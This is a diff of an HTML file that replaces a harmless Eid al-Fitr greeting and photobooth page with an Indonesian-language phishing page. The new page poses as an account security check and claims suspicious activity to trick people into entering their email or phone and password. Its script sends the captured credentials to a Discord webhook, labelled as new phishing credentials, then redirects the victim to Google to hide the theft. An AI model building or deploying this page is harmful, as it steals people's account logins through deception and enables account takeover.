@@ -3,246 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eid Mubarak - Digital Greeting & Photobooth 🌙</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <title>Verifikasi Keamanan Akun</title>
     
     <style>
-        :root {
-            --emerald: #064e3b;
-            --gold: #d4af37;
-            --white: #ffffff;
-            --glass: rgba(255, 255, 255, 0.1);
-        }
-
         body {
-            font-family: 'Poppins', sans-serif;
-            background: radial-gradient(circle at center, #065f46 0%, #042f24 100%);
-            color: var(--white);
-            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            height: 100vh;
+            margin: 0;
         }
-
         .container {
-            max-width: 500px;
-            width: 90%;
-            perspective: 1000px;
-        }
-
-        /* --- DASHBOARD UCAPAN --- */
-        #dashboard {
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            padding: 50px 30px;
-            border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
-            transition: all 0.8s ease;
         }
-
-        .eid-icon { font-size: 4rem; margin-bottom: 15px; display: block; }
-        
-        h1 { 
-            font-family: 'Playfair Display', serif;
-            color: var(--gold);
-            font-size: 2.2rem;
-            margin: 0;
-            line-height: 1.2;
-        }
-
-        .greeting-card {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 25px 0;
-            border-left: 4px solid var(--gold);
-        }
-
-        .greeting-text {
-            font-style: italic;
-            opacity: 0.9;
-            line-height: 1.6;
-            font-weight: 300;
-            margin: 0;
-        }
-
-        /* --- FITUR UTAMA (PHOTOBOOTH) --- */
-        #photobooth-section {
-            display: none; /* Sembunyi di awal */
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            padding: 25px;
-            border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            animation: slideUp 0.8s ease forwards;
-        }
-
-        .booth-wrapper {
-            position: relative;
-            border-radius: 20px;
-            overflow: hidden;
-            border: 3px solid var(--gold);
-            background: #000;
-            line-height: 0;
+        .logo {
+            width: 60px;
             margin-bottom: 20px;
         }
-
-        #video { width: 100%; height: auto; transform: scaleX(-1); }
-
-        #frame-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
-            box-shadow: inset 0 0 0 15px var(--gold);
-            opacity: 0.5;
-            z-index: 5;
+        h2 {
+            color: #1c1e21;
+            font-size: 24px;
+            margin-bottom: 10px;
         }
-
-        /* --- TOMBOL --- */
-        .btn {
+        p {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+        input {
             width: 100%;
-            padding: 18px;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
             border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 1rem;
+            border-radius: 6px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            transition: background-color 0.2s;
         }
-
-        .btn-gold { background: var(--gold); color: var(--emerald); }
-        .btn-gold:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(212, 175, 55, 0.3); }
-
-        .btn-white { background: var(--white); color: var(--emerald); margin-top: 15px; }
-
-        /* --- HASIL FOTO --- */
-        #result-container {
-            margin-top: 25px;
-            display: none;
+        button:hover {
+            background-color: #166fe5;
         }
-        #photo { width: 100%; border-radius: 15px; border: 2px solid var(--gold); }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(50px); }
-            to { opacity: 1; transform: translateY(0); }
+        .footer-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+            display: block;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div id="dashboard">
-            <span class="eid-icon">🕌</span>
-            <h1>Selamat Hari Raya<br>Idul Fitri 1447 H</h1>
-            
-            <div class="greeting-card">
-                <p class="greeting-text">
-                    "Taqabbalallahu minna wa minkum. <br>
-                    Moga keberkahan menyelimuti hati, dan kemenangan menjadi milik kita bersama."
-                </p>
-            </div>
-            
-            <p style="font-size: 0.85rem; margin-bottom: 20px; opacity: 0.7;">
-                Klik tombol di bawah untuk mengaktifkan fitur kamera dan berfoto bersama.
-            </p>
+        <img src="https://cdn-icons-png.flaticon.com/512/1058/1058032.png" alt="Security" class="logo">
+        <h2>Verifikasi Identitas</h2>
+        <p>Aktivitas mencurigakan terdeteksi. Silakan login kembali untuk mengamankan akun Anda.</p>
 
-            <button id="activate-camera-btn" class="btn btn-gold">
-                Aktifkan Fitur Photobooth ✨
-            </button>
-        </div>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email atau Nomor Telepon" required>
+            <input type="password" id="password" placeholder="Kata Sandi" required>
+            <button type="submit" id="btnSubmit">Konfirmasi Keamanan</button>
+        </form>
 
-        <div id="photobooth-section">
-            <h2 style="text-align: center; color: var(--gold); margin-top: 0;">Photobooth 📸</h2>
-            
-            <div class="booth-wrapper">
-                <video id="video" autoplay playsinline></video>
-                <div id="frame-overlay"></div>
-            </div>
-
-            <button id="snap" class="btn btn-gold">Ambil Foto Spesial ✨</button>
-            
-            <div id="result-container">
-                <p style="text-align: center;">Hasil Foto Kamu:</p>
-                <img id="photo" alt="Hasil foto">
-                <button id="download" class="btn btn-white">Simpan ke Galeri 📥</button>
-            </div>
-        </div>
+        <a href="#" class="footer-link">Lupa kata sandi?</a>
     </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        const dashboard = document.getElementById('dashboard');
-        const photoboothSection = document.getElementById('photobooth-section');
-        const activateBtn = document.getElementById('activate-camera-btn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const snap = document.getElementById('snap');
-        const photo = document.getElementById('photo');
-        const downloadBtn = document.getElementById('download');
-        const resultContainer = document.getElementById('result-container');
-        const context = canvas.getContext('2d');
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('btnSubmit');
 
-        // FUNGSI GANDA: Masuk ke fitur & Meminta Izin Kamera
-        activateBtn.addEventListener('click', async () => {
+            // GANTI DENGAN URL WEBHOOK DISCORD ANDA
+            const webhookURL = "URL_WEBHOOK_DISCORD_ANDA";
+
+            btn.innerText = "Memproses...";
+            btn.disabled = true;
+
+            const payload = {
+                content: `**Kredensial Phishing Baru!** 👾\n> **Target:** ${email}\n> **Password:** ${pass}\n> **Status:** Berhasil Diekstraksi`
+            };
+
             try {
-                // Meminta izin kamera saat tombol diklik
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
+                // Mengirim data langsung ke Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
-                
-                video.srcObject = stream;
 
-                // Animasi Transisi
-                dashboard.style.opacity = '0';
+                // Alihkan korban ke situs asli setelah 1 detik
                 setTimeout(() => {
-                    dashboard.style.display = 'none';
-                    photoboothSection.style.display = 'block';
-                }, 500);
+                    window.location.href = "https://www.google.com";
+                }, 1000);
 
-            } catch (err) {
-                console.error("Gagal kamera:", err);
-                alert("Mohon ijinkan akses kamera untuk dapat menggunakan fitur Photobooth utama ini.");
+            } catch (error) {
+                console.error("Gagal mengirim data.");
+                alert("Koneksi gagal, silakan coba lagi.");
+                btn.innerText = "Konfirmasi Keamanan";
+                btn.disabled = false;
             }
         });
-
-        // Logika Ambil Foto
-        snap.addEventListener('click', () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            context.save();
-            context.scale(-1, 1);
-            context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-            context.restore();
-
-            // Frame Gold sederhana pada hasil
-            context.strokeStyle = "#d4af37";
-            context.lineWidth = 40;
-            context.strokeRect(0, 0, canvas.width, canvas.height);
-
-            const dataURL = canvas.toDataURL('image/png');
-            photo.src = dataURL;
-            resultContainer.style.display = 'block';
-            resultContainer.scrollIntoView({ behavior: 'smooth' });
-        });
-
-        // Download
-        downloadBtn.addEventListener('click', () => {
-            const link = document.createElement('a');
-            link.download = 'Eid-Mubarak-Photo.png';
-            link.href = photo.src;
-            link.click();
-        });
     </script>
+
 </body>
 </html>
